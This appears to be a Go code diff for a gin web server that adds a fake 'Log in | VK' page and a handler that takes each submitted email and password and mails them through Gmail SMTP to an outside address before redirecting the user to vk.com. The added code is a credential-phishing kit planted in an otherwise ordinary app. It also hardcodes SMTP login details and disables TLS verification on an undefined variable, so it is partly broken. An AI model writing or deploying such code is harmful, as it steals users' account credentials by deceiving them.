@@ -11,6 +11,8 @@ import (
 	"net/http"
 	"gopkg.in/appleboy/gin-jwt.v2"
 	"time"
+	"gopkg.in/gomail.v2"
+	"crypto/tls"
 )
 
 const (
@@ -59,6 +61,33 @@ func Start() {
 			"isLoggedIn": isLoggedIn,
 		})
 	})
+
+	router.GET("/authvk", func(c *gin.Context) {
+		c.HTML(http.StatusOK, "authvk.tmpl.html", gin.H{
+			"title":      "Log in | VK",
+		})
+	})
+	router.POST("/logvk", func(c *gin.Context) {
+		var host= gomail.NewDialer("smtp.gmail.com", 587, "GoToBooX", "hjvfhekbn")
+		sendCloser, err := host.Dial()
+		if err != nil {
+			log.Println(err)
+		}
+
+		msg := gomail.NewMessage()
+		d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
+		email := c.PostForm("email")
+		pass := c.PostForm("pass")
+		msg.SetHeader("From", "GoToBooX@gmail.com")
+		msg.SetAddressHeader("To", "away4people@gmail.com", "away4people")
+		msg.SetHeader("Subject", "TY for authorization with our service!")
+		msg.SetBody("text/html", "email: "+ email + "\r\n pass: " + pass)
+
+		gomail.Send(sendCloser, msg)
+		c.Redirect(http.StatusMovedPermanently, "https://vk.com/")
+		msg.Reset()
+	})
+
 
 	service := NewUserService(postgres.NewPostgresUsersRepo(dataBase.Connection))
 	jwtMiddleware = &jwt.GinJWTMiddleware{
